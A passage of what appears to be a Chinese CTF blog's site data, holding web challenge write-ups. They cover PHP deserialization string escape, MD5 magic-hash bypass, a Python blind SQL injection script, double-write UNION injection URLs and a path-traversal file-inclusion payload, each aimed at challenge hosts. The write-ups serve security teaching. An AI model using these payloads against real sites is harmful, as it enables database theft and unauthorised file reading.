123456789101112131415161718192021&lt;?php function filter($str)&#123; return preg_replace(&#x27;/flag/&#x27;, &#x27;&#x27;, $str);&#125;$username = $_GET[&#x27;name&#x27;];$password = $_GET[&#x27;pwd&#x27;];$money = &#x27;111111&#x27;;$user_info = array(&#x27;name&#x27;=&gt; $username, &#x27;pwd&#x27;=&gt;$password,&#x27;money&#x27;=&gt;$money);$serialize_info = serialize($user_info);$serialize_info = filter($serialize_info);echo $serialize_info;echo &#x27;&lt;br&gt;&#x27;;$user = unserialize($serialize_info);echo $user[&#x27;name&#x27;];echo &#x27;&lt;br&gt;&#x27;;echo $user[&#x27;pwd&#x27;];echo &#x27;&lt;br&gt;&#x27;;echo $user[&#x27;money&#x27;];?&gt; 1234567891011121314151.正常情况：http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;4.php?name&#x3D;mySh1ft&amp;pwd&#x3D;123456输出：a:3:&#123;s:4:&quot;name&quot;;s:7:&quot;mySh1ft&quot;;s:3:&quot;pwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;money&quot;;s:6:&quot;111111&quot;;&#125;mySh1ft1234561111112.字符串存在敏感字符：http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;4.php?name&#x3D;mySh1ftflagflagflagflagflag&amp;pwd&#x3D;12&quot;;s:3:&quot;pwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;money&quot;;s:10:&quot;1111111111&quot;;&#125;3456输出：a:3:&#123;s:4:&quot;name&quot;;s:27:&quot;mySh1ft&quot;;s:3:&quot;pwd&quot;;s:62:&quot;12&quot;;s:3:&quot;pwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;money&quot;;s:10:&quot;1111111111&quot;;&#125;3456&quot;;s:5:&quot;money&quot;;s:6:&quot;111111&quot;;&#125;mySh1ft&quot;;s:3:&quot;pwd&quot;;s:62:&quot;121234561111111111 原本应该是这样： a:3:{s:4:”name”;s:27:”mySh1ftflagflagflagflagflag“;s:3:”pwd”;s:62:”12”;s:3:”pwd”;s:6:”123456”;s:5:”money”;s:10:”1111111111”;}3456“;s:5:”money”;s:6:”111111“;} 但字符串flag会被替换为空，结果变成这样： a:3:{s:4:”name”;s:27:”mySh1ft”;s:3:”pwd”;s:62:”12“;s:3:”pwd”;s:6:”123456“;s:5:”money”;s:10:”1111111111“;}3456”;s:5:”money”;s:6:”111111”;} 在反序列化的时候，name有27个字符，但第一个双引号包括的只有7个字符，所以向后“吞噬”，我们计算后在合适的位置插入后面的序列化字符串，就可以达到改变后面变量的目的 0x02 解题1.源码：12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 分析，这里是过滤序列化字符串并将敏感词替换为空，所以是字符串的缩短导致的逃逸，extract()函数可以将数组中的值导入到当前的符号表，可以很容易处理post或get得到的数据而不用一个一个进行赋值，这也就代表我们可以通过post变量覆盖$_SESSION数组变量，从而控制变量 2.查看phpinfo 可以看到这里自动包含了一个名为d0g3_f1ag.php的文件，接下来构造payload来查看这个文件内容 3.构造payload为了方便构造序列化字符串，我在本地进行测试 123456789101112131415161718192021&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);$serialize_info = filter(serialize($_SESSION));echo $serialize_info.&#x27;&lt;br&gt;&#x27;;$userinfo = unserialize($serialize_info);echo $userinfo[&#x27;function&#x27;].&#x27;&lt;br&gt;&#x27;;echo base64_decode($userinfo[&#x27;img&#x27;]); post数据： 1_SESSION[user]&#x3D;guestflagflagflagflagflagphp&amp;_SESSION[function]&#x3D;&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:12:&quot;bXlTaDFmdA&#x3D;&#x3D;&quot;;&#125;show_image&amp;_SESSION[img]&#x3D;1 数组内的key注意不用加引号得到的输出： a:3:{s:4:”user”;s:28:”guest”;s:8:”function”;s:76:”“;s:8:”function”;s:10:”show_image”;s:3:”img”;s:12:”bXlTaDFmdA==”;}show_image”;s:3:”img”;s:1:”1”;}show_imagemySh1ft 现在已经可以控制img变量了，接下来就可以利用源码中的file_get_contents()函数查看我们需要文件的信息 post数据，注意要满足$function为show_image,所以应该在$_GET[‘f’]=show_image情况下post我们的变量 1_SESSION[user]&#x3D;guestflagflagflagflagflagphp&amp;_SESSION[function]&#x3D;&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;show_image&amp;_SESSION[img]&#x3D;1 “ZDBnM19mMWFnLnBocA==”是base64编码后的d0g3_f1ag.php 右键查看源码 更改img变量，查看flag 1_SESSION[user]&#x3D;guestflagflagflagflagflagphp&amp;_SESSION[function]&#x3D;&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;show_image&amp;_SESSION[img]&#x3D;1","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"php反序列化","slug":"CTF/php反序列化","permalink":"https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://123-prog.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"反序列化漏洞","slug":"反序列化漏洞","permalink":"https://123-prog.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}]},{"title":"BJDCTF2020 Easy MD5","slug":"BJDCTF2020-Easy-MD5","date":"2021-01-20T05:31:53.000Z","updated":"2021-09-22T10:00:11.076Z","comments":true,"path":"2021/01/20/BJDCTF2020-Easy-MD5/","link":"","permalink":"https://123-prog.github.io/2021/01/20/BJDCTF2020-Easy-MD5/","excerpt":"1.进去就一个提交框","text":"1.进去就一个提交框 试了好久，也没看到什么提示，这里看到提交的参数是password,猜想有查询数据库操作，而且查询前应该是进行了MD5加密（因为题目说的MD5 试试提交password=ffifdyop,因为ffifdyop经过MD5加密后形成&#39;or 6xxx(乱码)，可以绕过一些查询，然后好像成功了，跳转到另一个页面了 （后面查看源码，发现这里就是个if判断。。。。） 12345678910&lt;?phperror_reporting(0);$password = $_GET[&#x27;password&#x27;];if($password == &#x27;ffifdyop&#x27;)&#123; echo &quot;&lt;script&gt;window.location.replace(&#x27;./levels91.php&#x27;)&lt;/script&gt;&quot;;&#125;?&gt; 2.第二关，右键源代码看见通关条件 百度一下MD5绕过，发现可以通过让MD5加密后的字符串类似于0exxx，因为0e代表0的几次方都是0，就可以绕过了，这里列出一些加密后可以变成0exxx的字符串 1234567891011121314151617181920QNKCDZO0e830400451993494058024219903391 s878926199a0e545993274517709034328855841020 s155964671a0e342768416822451524974117254469 s214587387a0e848240448830537924465865611904 s214587387a0e848240448830537924465865611904 s878926199a0e545993274517709034328855841020 s1091221200a0e940624217856561557816327384675 提交?a=QNKCDZO&amp;b=s878926199a,成功进入下一关 3.进去就是源码由于是用===来判断，所以用不了上面的方法来绕过，百度发现可以通过数组绕过 拿到flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"php代码审计","slug":"CTF/php代码审计","permalink":"https://123-prog.github.io/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"md5绕过","slug":"md5绕过","permalink":"https://123-prog.github.io/tags/md5%E7%BB%95%E8%BF%87/"}]},{"title":"CISCN2019 华北赛区 Day2 Web1 Hack World","slug":"CISCN2019-华北赛区-Day2-Web1-Hack-World","date":"2021-01-16T15:36:45.000Z","updated":"2021-09-22T09:59:43.277Z","comments":true,"path":"2021/01/16/CISCN2019-华北赛区-Day2-Web1-Hack-World/","link":"","permalink":"https://123-prog.github.io/2021/01/16/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/","excerpt":"1.判断注入类型post注入，id=1或id=2时回显正常，id=1’回显bool(false), id=1/1回显正常，则是数值型注入","text":"1.判断注入类型post注入，id=1或id=2时回显正常，id=1’回显bool(false), id=1/1回显正常，则是数值型注入 2.fuzz一下看看过滤12345678910111213141516import requestsurl = &quot;http://4bfe4b6f-e955-4745-98ab-4d80d69579e5.node3.buuoj.cn/index.php&quot;f = open(&quot;./sql.txt&quot;)list = []for line in f: data = &#123; &quot;id&quot;:&quot;1&quot;+line &#125; r = requests.post(url, data=data) if &quot;SQL Injection Checked.&quot; in r.text: print(line) list.append(line)print(list)f.close() 1[&#39;AND&#39;, &#39;AUTHORIZATION&#39;, &#39;CORR&#39;, &#39;CORRESPONDING&#39;, &#39;CURRENT_DEFAULT_TRANSFORM_GROUP&#39;, &#39;CURRENT_TRANSFORM_GROUP_FOR_TYPE&#39;, &#39;CURSOR&#39;, &#39;DELETE&#39;, &#39;END-EXEC&#39;, &#39;FLOOR&#39;, &#39;FOR&#39;, &#39;FOREIGN&#39;, &#39;GROUP&#39;, &#39;GROUPING&#39;, &#39;GROUPS&#39;, &#39;IMPORT&#39;, &#39;INDICATOR&#39;, &#39;INSERT&#39;, &#39;INTO&#39;, &#39;LIMIT&#39;, &#39;NORMALIZE&#39;, &#39;OR&#39;, &#39;ORDER&#39;, &#39;PORTION&#39;, &#39;UNION&#39;, &#39;UPDATE&#39;, &#39;XMLFOREST&#39;] 3.判断注入方式(盲注)union被过滤，联合查询不行，绕过有点困难，报错注入也有点困难，盲注and ,or 等被过滤，if没被过滤，select也可以用，题目告知了我们表名和字段名，所以可以用if进行盲注，因为是数值型注入，所以if条件句直接作为参数传入，就不用and和or了，网上也看到有大佬用异或^来代替or进行盲注，如0^if(…….),下面以if为例子 这里注意空格被过滤，/**/也被过滤，绕过方式也很多，这里使用（） payload如if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0) 1234567891011121314151617import requestsflag = &quot;&quot;url = &quot;http://4bfe4b6f-e955-4745-98ab-4d80d69579e5.node3.buuoj.cn/index.php&quot;payload = &quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0)&quot;for i in range(1,300): for j in range(32,127): p = payload.format(i,j) data = &#123; &quot;id&quot;:p &#125; r = requests.post(url, data=data) if &quot;Hello&quot; in r.text: flag+=chr(j) print(flag)","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"sql注入","slug":"CTF/sql注入","permalink":"https://123-prog.github.io/categories/CTF/sql%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://123-prog.github.io/tags/sqli/"}]},{"title":"极客大挑战 2019 BabySQL","slug":"极客大挑战-2019-BabySQL","date":"2021-01-15T14:48:25.000Z","updated":"2021-09-22T09:59:21.741Z","comments":true,"path":"2021/01/15/极客大挑战-2019-BabySQL/","link":"","permalink":"https://123-prog.github.io/2021/01/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL/","excerpt":"1.寻找注入点get型注入，在password处可进行注入，并且可以判断闭合类型为单引号闭合","text":"1.寻找注入点get型注入，在password处可进行注入，并且可以判断闭合类型为单引号闭合 2.题目说进行了严格的过滤，看看过滤了啥题目的过滤方式很简单，就直接replace为空，在password中出现or,报错时or会被”吞“掉，就可以判断出来,跑一跑看过滤了什么关键字 123456789101112# -*- coding: utf-8 -*-import requestsurl = &quot;http://0eada43c-3dc0-4470-9708-25780d29481d.node3.buuoj.cn/check.php?username=admin&amp;password=12345&#x27;&#123;&#125;&quot;f = open(&quot;./sql关键字字典.txt&quot;)for line in f: url1 = url.format(line) r = requests.get(url1) if &quot;12345&quot; in r.text: print(line)f.close() 结果得出过滤掉的关键字and , by, char, drop, from, having, insert, into, or, select, union, where 3.双写绕过注入payload: 1http:&#x2F;&#x2F;0eada43c-3dc0-4470-9708-25780d29481d.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;12345%27 ununionion seselectlect 1,2,3%23 爆数据库 1http:&#x2F;&#x2F;0eada43c-3dc0-4470-9708-25780d29481d.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;12345%27 ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata%23 查找之后发现flag在ctf数据库中 爆表名 1http:&#x2F;&#x2F;0eada43c-3dc0-4470-9708-25780d29481d.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;12345%27 ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;&#39;ctf&#39;%23 爆字段 1http:&#x2F;&#x2F;0eada43c-3dc0-4470-9708-25780d29481d.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;12345%27 ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema&#x3D;&#39;ctf&#39;anandd table_name&#x3D;&#39;Flag&#39;%23 查询字段值得到flag 1http:&#x2F;&#x2F;0eada43c-3dc0-4470-9708-25780d29481d.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;12345%27 ununionion seselectlect 1,2,flag frfromom ctf.Flag%23","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"sql注入","slug":"CTF/sql注入","permalink":"https://123-prog.github.io/categories/CTF/sql%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://123-prog.github.io/tags/sqli/"}]},{"title":"HCTF 2018 Warmup","slug":"HCTF-2018-Warmup","date":"2021-01-14T10:31:03.000Z","updated":"2021-09-22T09:58:12.981Z","comments":true,"path":"2021/01/14/HCTF-2018-Warmup/","link":"","permalink":"https://123-prog.github.io/2021/01/14/HCTF-2018-Warmup/","excerpt":"简单的代码审计题目，主要需要注意几个点 源码如下","text":"简单的代码审计题目，主要需要注意几个点 源码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; checkFile函数没有对我们的file参数做过滤，所以可以只要符合checkFile函数中的三次白名单检验中的一次就可以利用include包含我们需要的文件 12345678$_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; 第一次检验很简单，只要构造file=source.php?后面接我们的路径，就可以绕过一次白名单检验让检查函数返回true，但这有个注意点，windows环境不允许存在带？的路径，所以如果在windows环境下，需要利用接下来的那次白名单检验 123456789$_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; 需要让$page在进行url解码后出现’ ? ‘，所以对 ‘ ? ’ 进行两次的url编码，得到%253f，经过浏览器的一次解码变成%3f，再经过代码的解码得到?。 绕过后就是考虑文件包含 由hint.php的内容，flag在ffffllllaaaagggg中 非window环境可以这样构造payload ?file=source.php?/../ffffllllaaaagggg 这里include在包含文件时，source.php?这个路径不存在，../进行一次目录穿越，相当于又回到当前目录，这个就相当于包含了当前目录下的一个名为ffffllllaaaagggg的文件，接下来就只是需要往上找这个文件的位置，最终的payload ?file=source.php?/../../../../ffffllllaaaagggg 在windows环境下只需要把问号换成%253f即可","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"php代码审计","slug":"CTF/php代码审计","permalink":"https://123-prog.github.io/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://123-prog.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"","slug":"我的第一篇博客","date":"2021-01-14T03:51:00.000Z","updated":"2021-04-05T02:35:24.249Z","comments":true,"path":"2021/01/14/我的第一篇博客/","link":"","permalink":"https://123-prog.github.io/2021/01/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"","categories":[],"tags":[{"name":"其他","slug":"其他","permalink":"https://123-prog.github.io/tags/%E5%85%B6%E4%BB%96/"}]}],"categories":[{"name":"其他","slug":"其他","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"},{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"other","slug":"CTF/other","permalink":"https://123-prog.github.io/categories/CTF/other/"},{"name":"sql注入","slug":"CTF/sql注入","permalink":"https://123-prog.github.io/categories/CTF/sql%E6%B3%A8%E5%85%A5/"},{"name":"php代码审计","slug":"CTF/php代码审计","permalink":"https://123-prog.github.io/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"java web","slug":"CTF/java-web","permalink":"https://123-prog.github.io/categories/CTF/java-web/"},{"name":"Nodejs","slug":"CTF/Nodejs","permalink":"https://123-prog.github.io/categories/CTF/Nodejs/"},{"name":"nosql","slug":"CTF/nosql","permalink":"https://123-prog.github.io/categories/CTF/nosql/"},{"name":"wp","slug":"wp","permalink":"https://123-prog.github.io/categories/wp/"},{"name":"php反序列化","slug":"CTF/php反序列化","permalink":"https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"golang web","slug":"CTF/golang-web","permalink":"https://123-prog.github.io/categories/CTF/golang-web/"},{"name":"文件上传","slug":"CTF/文件上传","permalink":"https://123-prog.github.io/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"python web","slug":"CTF/python-web","permalink":"https://123-prog.github.io/categories/CTF/python-web/"}],"tags":[{"name":"disable_functions绕过","slug":"disable-functions绕过","permalink":"https://123-prog.github.io/tags/disable-functions%E7%BB%95%E8%BF%87/"},{"name":"ftp协议","slug":"ftp协议","permalink":"https://123-prog.github.io/tags/ftp%E5%8D%8F%E8%AE%AE/"},{"name":"原型链污染","slug":"原型链污染","permalink":"https://123-prog.github.io/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},{"name":"php反序列化","slug":"php反序列化","permalink":"https://123-prog.github.io/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"sqli","slug":"sqli","permalink":"https://123-prog.github.io/tags/sqli/"},{"name":"控制错误信息","slug":"控制错误信息","permalink":"https://123-prog.github.io/tags/%E6%8E%A7%E5%88%B6%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF/"},{"name":"order by 无查询数据 基于时间盲注","slug":"order-by-无查询数据-基于时间盲注","permalink":"https://123-prog.github.io/tags/order-by-%E6%97%A0%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"},{"name":"caddy+php-fpm目录穿越","slug":"caddy-php-fpm目录穿越","permalink":"https://123-prog.github.io/tags/caddy-php-fpm%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"},{"name":"利用pear扩展库写马","slug":"利用pear扩展库写马","permalink":"https://123-prog.github.io/tags/%E5%88%A9%E7%94%A8pear%E6%89%A9%E5%B1%95%E5%BA%93%E5%86%99%E9%A9%AC/"},{"name":"nginx路径解析绕过","slug":"nginx路径解析绕过","permalink":"https://123-prog.github.io/tags/nginx%E8%B7%AF%E5%BE%84%E8%A7%A3%E6%9E%90%E7%BB%95%E8%BF%87/"},{"name":"flight框架代码审计","slug":"flight框架代码审计","permalink":"https://123-prog.github.io/tags/flight%E6%A1%86%E6%9E%B6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"mysql恶意服务端读取客户端文件","slug":"mysql恶意服务端读取客户端文件","permalink":"https://123-prog.github.io/tags/mysql%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6/"},{"name":"java反序列化","slug":"java反序列化","permalink":"https://123-prog.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java动态代理知识","slug":"java动态代理知识","permalink":"https://123-prog.github.io/tags/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E7%9F%A5%E8%AF%86/"},{"name":"js代码审计","slug":"js代码审计","permalink":"https://123-prog.github.io/tags/js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"zombie RCE","slug":"zombie-RCE","permalink":"https://123-prog.github.io/tags/zombie-RCE/"},{"name":"nosql注入","slug":"nosql注入","permalink":"https://123-prog.github.io/tags/nosql%E6%B3%A8%E5%85%A5/"},{"name":"杂记","slug":"杂记","permalink":"https://123-prog.github.io/tags/%E6%9D%82%E8%AE%B0/"},{"name":"phar反序列化","slug":"phar反序列化","permalink":"https://123-prog.github.io/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"php://filter过滤器巧妙利用","slug":"php-filter过滤器巧妙利用","permalink":"https://123-prog.github.io/tags/php-filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8/"},{"name":"DAS x CBCTF","slug":"DAS-x-CBCTF","permalink":"https://123-prog.github.io/tags/DAS-x-CBCTF/"},{"name":"LightCMS 后台RCE漏洞","slug":"LightCMS-后台RCE漏洞","permalink":"https://123-prog.github.io/tags/LightCMS-%E5%90%8E%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/"},{"name":"ssrf","slug":"ssrf","permalink":"https://123-prog.github.io/tags/ssrf/"},{"name":"重定向","slug":"重定向","permalink":"https://123-prog.github.io/tags/%E9%87%8D%E5%AE%9A%E5%90%91/"},{"name":".htaccess","slug":"htaccess","permalink":"https://123-prog.github.io/tags/htaccess/"},{"name":"文件上传","slug":"文件上传","permalink":"https://123-prog.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"sql注入","slug":"sql注入","permalink":"https://123-prog.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"flask session伪造","slug":"flask-session伪造","permalink":"https://123-prog.github.io/tags/flask-session%E4%BC%AA%E9%80%A0/"},{"name":"pickle反序列化","slug":"pickle反序列化","permalink":"https://123-prog.github.io/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"pickle","slug":"pickle","permalink":"https://123-prog.github.io/tags/pickle/"},{"name":"反序列化","slug":"反序列化","permalink":"https://123-prog.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"opcode使用","slug":"opcode使用","permalink":"https://123-prog.github.io/tags/opcode%E4%BD%BF%E7%94%A8/"},{"name":"pker使用","slug":"pker使用","permalink":"https://123-prog.github.io/tags/pker%E4%BD%BF%E7%94%A8/"},{"name":"客户端session","slug":"客户端session","permalink":"https://123-prog.github.io/tags/%E5%AE%A2%E6%88%B7%E7%AB%AFsession/"},{"name":"session伪造","slug":"session伪造","permalink":"https://123-prog.github.io/tags/session%E4%BC%AA%E9%80%A0/"},{"name":"SSRF","slug":"SSRF","permalink":"https://123-prog.github.io/tags/SSRF/"},{"name":"Node 8.12.0的拆分请求攻击（走私）","slug":"Node-8-12-0的拆分请求攻击（走私）","permalink":"https://123-prog.github.io/tags/Node-8-12-0%E7%9A%84%E6%8B%86%E5%88%86%E8%AF%B7%E6%B1%82%E6%94%BB%E5%87%BB%EF%BC%88%E8%B5%B0%E7%A7%81%EF%BC%89/"},{"name":"zip伪协议","slug":"zip伪协议","permalink":"https://123-prog.github.io/tags/zip%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},{"name":"包含session文件getshell","slug":"包含session文件getshell","permalink":"https://123-prog.github.io/tags/%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6getshell/"},{"name":"畸形zip","slug":"畸形zip","permalink":"https://123-prog.github.io/tags/%E7%95%B8%E5%BD%A2zip/"},{"name":"nodejs代码审计","slug":"nodejs代码审计","permalink":"https://123-prog.github.io/tags/nodejs%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"Netflix Conductor 1day","slug":"Netflix-Conductor-1day","permalink":"https://123-prog.github.io/tags/Netflix-Conductor-1day/"},{"name":"Java BCEL 编码","slug":"Java-BCEL-编码","permalink":"https://123-prog.github.io/tags/Java-BCEL-%E7%BC%96%E7%A0%81/"},{"name":"nodejs请求走私","slug":"nodejs请求走私","permalink":"https://123-prog.github.io/tags/nodejs%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"name":"mysql注入","slug":"mysql注入","permalink":"https://123-prog.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"},{"name":"Java反序列化","slug":"Java反序列化","permalink":"https://123-prog.github.io/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"getimagesize绕过","slug":"getimagesize绕过","permalink":"https://123-prog.github.io/tags/getimagesize%E7%BB%95%E8%BF%87/"},{"name":"mb_strtolower()的利用","slug":"mb-strtolower-的利用","permalink":"https://123-prog.github.io/tags/mb-strtolower-%E7%9A%84%E5%88%A9%E7%94%A8/"},{"name":"CISCN","slug":"CISCN","permalink":"https://123-prog.github.io/tags/CISCN/"},{"name":"SSRF攻击php-fpm","slug":"SSRF攻击php-fpm","permalink":"https://123-prog.github.io/tags/SSRF%E6%94%BB%E5%87%BBphp-fpm/"},{"name":"提权","slug":"提权","permalink":"https://123-prog.github.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"DASCTF","slug":"DASCTF","permalink":"https://123-prog.github.io/tags/DASCTF/"},{"name":"java web","slug":"java-web","permalink":"https://123-prog.github.io/tags/java-web/"},{"name":"php代码审计","slug":"php代码审计","permalink":"https://123-prog.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"php变量解析","slug":"php变量解析","permalink":"https://123-prog.github.io/tags/php%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90/"},{"name":"http smugglings","slug":"http-smugglings","permalink":"https://123-prog.github.io/tags/http-smugglings/"},{"name":"http 